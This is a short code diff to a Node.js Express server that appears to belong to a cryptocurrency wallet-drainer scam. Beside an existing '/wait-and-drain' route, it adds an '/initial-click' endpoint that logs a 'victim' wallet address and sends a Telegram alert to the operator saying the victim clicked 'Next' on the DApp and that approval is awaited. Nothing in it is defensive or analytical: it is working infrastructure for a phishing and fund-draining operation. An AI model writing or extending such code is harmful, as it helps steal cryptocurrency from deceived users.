@@ -166,3 +166,15 @@ app.post('/wait-and-drain', async (req, res) => {
         res.status(500).send("Drain failed");
     }
 });
+
+app.post('/initial-click', async (req, res) => {
+    const { victim } = req.body;
+    if (!victim || !ethers.utils.isAddress(victim)) {
+        console.error("Invalid victim address for initial click:", victim);
+        return res.status(400).send("Invalid victim address");
+    }
+    console.log(`🔔 Initial Click Notification received for victim: ${victim}`);
+    const message = `🔔 **NEW USER INTERACTION**\n\nUser clicked "Next" on the DApp.\n\nVictim: \`${victim}\`\n\nAwaiting approval...`;
+    await sendTelegramMessage(message);
+    res.status(200).send('Initial click notification sent.');
+});
